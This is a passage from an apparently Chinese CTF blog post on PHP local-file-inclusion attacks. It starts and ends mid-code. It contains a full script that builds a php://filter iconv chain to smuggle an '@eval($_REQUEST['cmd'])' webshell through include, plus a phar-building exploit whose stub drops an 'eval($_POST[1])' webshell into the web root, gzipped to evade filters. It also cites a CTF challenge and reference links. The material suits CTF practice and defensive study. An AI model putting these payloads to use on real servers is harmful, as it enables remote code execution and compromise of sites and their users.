</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 基础payload，这是一个被base64编码的字符串
</span></span></span><span class="line"><span class="cl"><span class="c1">// 解码后的内容是 &lt;?php @eval($_REQUEST[&#39;cmd&#39;]);，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="c1">// 定义一个转换规则数组，每个字符对应多种iconv转换规则组合
</span></span></span><span class="line"><span class="cl"><span class="c1">// 这些规则用于在字符编码转换过程中混淆payload，绕过安全检测
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$conversions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// &#39;/&#39; 字符的转换规则，通过多次iconv转换来混淆数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// 数字字符的转换规则
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 每个数字对应多个稀奇古怪的字符编码转换规则组合
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;0&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;1&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;2&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;3&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;5&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;6&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// 大写字母的转换规则
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;A&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;E&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;F&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;G&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;H&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;I&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;J&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;K&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;L&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;M&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;N&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;O&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Q&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;S&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;T&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;X&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Z&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// 小写字母的转换规则
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 同样使用各种稀奇古怪的字符编码转换组合来混淆数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;b&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;c&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;e&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;g&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;h&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;i&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;j&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;k&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;l&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;m&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;n&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;o&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;q&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;r&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;t&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;u&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;v&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;w&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 初始化过滤链，首先进行base64编码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filters</span> <span class="o">=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 遍历反转后的base64_payload中的每个字符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">foreach</span> <span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$base64_payload</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 为每个字符添加对应的转换规则链
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="nv">$conversions</span><span class="p">[</span><span class="nv">$c</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// 添加base64解码和编码步骤，用于进一步混淆数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// 添加UTF8到UTF7的转换，继续混淆数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 最后添加base64解码完成整个转换链
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 构建最终payload，使用php://filter协议和构建的过滤链读取/etc/passwd文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$final_payload</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="nv">$filters</span><span class="si">}</span><span class="s2">/resource=/etc/passwd&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$final_payload</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2024xyctf:ezLFI,连连看到底是连连什么看
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://cloud.tencent.com/developer/article/2287108?areaId=106001"  target="_blank" rel="noopener"
    >利用filter过滤器的编码组合构造RCE-腾讯云开发者社区-腾讯云</a></p>
<p><a class="link" href="https://www.ctfiot.com/22057.html"  target="_blank" rel="noopener"
    >php://filter特性包含任意文件getshell | CTF导航</a></p>
<h2 id="九include解析phar文件执行命令">九:include解析phar文件执行命令
</h2><p>这个考点一般发生在当考文件上传+include的时候</p>
<p>include遇到phar文件会自动解析,因此我们在phar文件内写入恶意代码，包含后就会执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;exp.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">compressFiles</span><span class="p">(</span><span class="nx">Phar</span><span class="o">::</span><span class="na">GZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">STUB</span><span class="s">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s">  $filename=&#34;/var/www/html/2.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">  $content=&#34;&lt;?php eval(\$_POST[1]);?&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">  file_put_contents($filename, $content);
</span></span></span><span class="line"><span class="cl"><span class="s">        __HALT_COMPILER();
</span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">gzopen</span><span class="p">(</span><span class="s2">&#34;exp.phar.gz&#34;</span><span class="p">,</span> <span class="s1">&#39;w9&#39;</span><span class="p">);</span>	<span class="c1">#压缩为gz绕过过滤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">gzwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>解析过程</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
